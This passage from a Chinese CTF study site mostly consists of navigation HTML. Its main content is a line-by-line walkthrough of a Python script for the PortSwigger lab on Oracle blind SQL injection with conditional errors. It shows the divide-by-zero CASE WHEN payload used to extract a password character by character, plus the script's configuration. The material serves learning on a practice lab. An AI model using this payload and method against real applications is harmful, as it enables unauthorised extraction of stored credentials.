+  <a href="#q4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q4：想同时跑多道题？
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        十二、附：payload 结构速记
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../upload/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    文件上传
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_3" id="__nav_2_3_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    文件上传
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%93%E9%A2%98/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    文件上传专题
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../rce/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    RCE
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_4" id="__nav_2_4_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    RCE
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../rce/RCE%E4%B8%93%E9%A2%98/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    RCE 专题
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_5" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../web/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web 通用
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_5" id="__nav_2_5_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Web 通用
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/CTF-Web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CTF-Web 学习笔记
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_6" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../audit/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    代码审计
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_6" id="__nav_2_6_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    代码审计
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../audit/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8-PHP%E4%B8%8EJava/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    代码审计入门
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../blog/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WP 博客
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    WP 博客
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    归档
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    归档
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blog/archive/2026/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2026
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    分类
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    分类
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blog/category/portswigger/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PortSwigger
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blog/category/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    代码执行
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blog/category/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    命令注入
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blog/category/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    文件上传
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../files/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    工具字典
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    工具字典
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        零、一句话原理
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        一、整体流程
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#127" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        二、第 1–27 行：文件头与导入
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2937" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        三、第 29–37 行：配置区（最常改的地方）
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4046" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        四、第 40–46 行：构造注入语句（脚本的核心）
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="四、第 40–46 行：构造注入语句（脚本的核心）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#44" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        44 行的可替换部件
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#45" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        45 行：不同数据库的「报错装置」
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4953-http" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        五、第 49–53 行：发一个 HTTP 请求
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5669" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        六、第 56–69 行：单次探测（问一个是非题）
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7281" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        七、第 72–81 行：二分查找（核心算法）
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="七、第 72–81 行：二分查找（核心算法）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        为什么 7 次一定能找到
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        改造点
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#84105" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        八、第 84–105 行：通道自检（开机自检）
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#108160" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        九、第 108–160 行：主流程
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="九、第 108–160 行：主流程">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#108119" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        108–119 行：参数检查与横幅
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#121125" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        121–125 行：自检闸门
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#127132" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        127–132 行：准备并行
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#133144" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        133–144 行：收集结果
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#146156" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        146–156 行：输出结果
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#159160" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        159–160 行：入口
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        十、改造速查表
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        十一、常见问题
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="十一、常见问题">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#q1-probe-true" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q1：为什么 probe 返回 True 表示「字符更大」？
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q2：自检过了但爆破结果全错？
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q3-probe-failed" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q3：全是 ? / 大量 probe failed？
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#q4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Q4：想同时跑多道题？
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        十二、附：payload 结构速记
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="blind_sqli_errorpy"><code>blind_sqli_error.py</code> 逐行讲解<a class="headerlink" href="#blind_sqli_errorpy" title="Permanent link">&para;</a></h1>
+<blockquote>
+<p>配套脚本：<code>E:\dsh\sql\blind_sqli_error.py</code>（约 169 行）
+适用题型：Oracle 盲 SQL 注入 · 条件错误型（PortSwigger «Blind SQL injection with conditional errors»）
+阅读方式：按功能块组织，每块标注行号，可直接在对话里引用「第 X 行」提问</p>
+</blockquote>
+<hr />
+<h2 id="_1">零、一句话原理<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="k">CASE</span><span class="w"> </span><span class="k">WHEN</span><span class="w"> </span><span class="n">ASCII</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="n">pos</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">N</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="w">     </span><span class="k">THEN</span><span class="w"> </span><span class="n">TO_CHAR</span><span class="p">(</span><span class="mi">1</span><span class="o">/</span><span class="mi">0</span><span class="p">)</span><span class="w">      </span><span class="c1">-- 条件为真 → 除零 → HTTP 500</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">     </span><span class="k">ELSE</span><span class="w"> </span><span class="s1">'a'</span><span class="w">               </span><span class="c1">-- 条件为假 → 正常 → HTTP 200</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="k">END</span>
+</span></code></pre></div>
+<p><strong>用「500 还是 200」当探针，再用二分查找把每个字符压到 7 次请求以内。</strong></p>
+<hr />
+<h2 id="_2">一、整体流程<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>填配置(BASE_URL / TRACKING / LENGTH)
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>        ↓
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>参数检查(第 109 行:占位符没改就退出)
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>        ↓
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>通道自检(第 121 行:1=1 必炸、1=2 必不炸)
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>        ↓ 不通 → 退出
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>        ↓ 通
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>20 个位置并行 → 每位二分查找(find_char)
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>        ↓
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>拼装密码 → 输出
+</span></code></pre></div>
+<p><strong>关键设计：自检前置。</strong> 盲注最难的是「分不清 500 是命中还是写错了」，自检把这个问题挡在跑数据之前。</p>
+<hr />
+<h2 id="127">二、第 1–27 行：文件头与导入<a class="headerlink" href="#127" title="Permanent link">&para;</a></h2>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="mi">1</span>   <span class="c1">#!/usr/bin/env python3</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="mi">2</span>   <span class="c1"># -*- coding: utf-8 -*-</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="mi">3</span><span class="o">-</span><span class="mi">18</span> <span class="s2">"""Oracle 盲注(条件错误型)自动爆破脚本 ..."""</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="mi">20</span>  <span class="kn">import</span><span class="w"> </span><span class="nn">concurrent.futures</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="mi">21</span>  <span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="mi">22</span>  <span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="mi">23</span>  <span class="kn">import</span><span class="w"> </span><span class="nn">urllib3</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="mi">25</span>  <span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="mi">27</span>  <span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">urllib3</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
+</span></code></pre></div>
+<table>
+<thead>
+<tr>
+<th>行</th>
+<th>内容</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>1</strong></td>
+<td><code>#!/usr/bin/env python3</code></td>
+<td>Shebang。Linux/Mac 下 <code>./script.py</code> 直接运行时指定解释器。<strong>Windows 无效，可忽略</strong></td>
+</tr>
+<tr>
+<td><strong>2</strong></td>
+<td><code># -*- coding: utf-8 -*-</code></td>
+<td>声明源码 UTF-8，否则中文注释可能乱码</td>
+</tr>
+<tr>
+<td><strong>3–18</strong></td>
+<td><code>"""..."""</code></td>
+<td>文件级文档字符串，<code>help()</code> 可查看</td>
+</tr>
+<tr>
+<td><strong>20</strong></td>
+<td><code>concurrent.futures</code></td>
+<td>线程池，用于 20 个位置并行</td>
+</tr>
+<tr>
+<td><strong>21</strong></td>
+<td><code>sys</code></td>
+<td>仅用于 <code>sys.exit()</code></td>
+</tr>
+<tr>
+<td><strong>22</strong></td>
+<td><code>time</code></td>
+<td>计时 + 重试前 <code>sleep</code></td>
+</tr>
+<tr>
+<td><strong>23</strong></td>
+<td><code>urllib3</code></td>
+<td>用于关闭 SSL 警告</td>
+</tr>
+<tr>
+<td><strong>25</strong></td>
+<td><code>requests</code></td>
+<td>HTTP 请求库（核心）</td>
+</tr>
+<tr>
+<td><strong>27</strong></td>
+<td><code>disable_warnings</code></td>
+<td>第 36 行关掉了证书校验，requests 会刷警告，这行静音</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>改造点</strong>：若目标证书正常，可把第 36 行改 <code>True</code>，并删掉第 23、27 行。</p>
+</blockquote>
+<hr />
+<h2 id="2937">三、第 29–37 行：配置区（最常改的地方）<a class="headerlink" href="#2937" title="Permanent link">&para;</a></h2>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="mi">30</span>  <span class="n">BASE_URL</span> <span class="o">=</span> <span class="s2">"https://YOUR-LAB-ID.web-security-academy.net/"</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="mi">31</span>  <span class="n">SESSION</span> <span class="o">=</span> <span class="s2">""</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="mi">32</span>  <span class="n">TRACKING</span> <span class="o">=</span> <span class="s2">"a3HRZtX4AN2q3pTa"</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="mi">33</span>  <span class="n">PASSWORD_LEN</span> <span class="o">=</span> <span class="mi">20</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="mi">34</span>  <span class="n">THREADS</span> <span class="o">=</span> <span class="mi">4</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="mi">35</span>  <span class="n">TIMEOUT</span> <span class="o">=</span> <span class="mi">20</span>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="mi">36</span>  <span class="n">VERIFY_SSL</span> <span class="o">=</span> <span class="kc">False</span>
+</span></code></pre></div>
+<table>
+<thead>
+<tr>
+<th>行</th>
+<th>作用</th>
+<th>什么时候改</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>30</strong></td>
+<td>目标地址</td>
+<td>换 lab 必改。<strong>必须带 <code>https://</code> 和结尾 <code>/</code></strong></td>
+</tr>
+<tr>
+<td><strong>31</strong></td>
+<td>session cookie</td>
+<td>需要登录态才有差异时填；否则留空</td>
+</tr>
+<tr>
+<td><strong>32</strong></td>
+<td><strong>注入点原始值</strong></td>
+<td>⚠️ 最关键。填 TrackingId 原值（不含单引号）</td>
+</tr>
+<tr>
+<td><strong>33</strong></td>
+<td>密码长度</td>
+<td>先用 <code>length(password)&gt;N</code> 手工确认</td>
+</tr>
+<tr>
+<td><strong>34</strong></td>
+<td>并发位数</td>
+<td><code>4</code> 稳、<code>8</code> 快；被限流就调小</td>
+</tr>
+<tr>
+<td><strong>35</strong></td>
+<td>单次超时（秒）</td>
+<td>网络差调大</td>
+</tr>
+<tr>
+<td><strong>36</strong></td>
+<td>是否校验 SSL</td>
+<td>本地代理可能拦截证书，故 <code>False</code></td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>设计意图</strong>：所有可变量集中在顶部，换目标时只改这一块。</p>
+</blockquote>
+<hr />
+<h2 id="4046">四、第 40–46 行：构造注入语句（脚本的核心）<a class="headerlink" href="#4046" title="Permanent link">&para;</a></h2>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="mi">40</span>  <span class="k">def</span><span class="w"> </span><span class="nf">build_payload</span><span class="p">(</span><span class="n">pos</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">ascii_val</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="mi">41</span>      <span class="s2">"""构造注入后的 TrackingId"""</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="mi">42</span>      <span class="k">return</span> <span class="p">(</span>
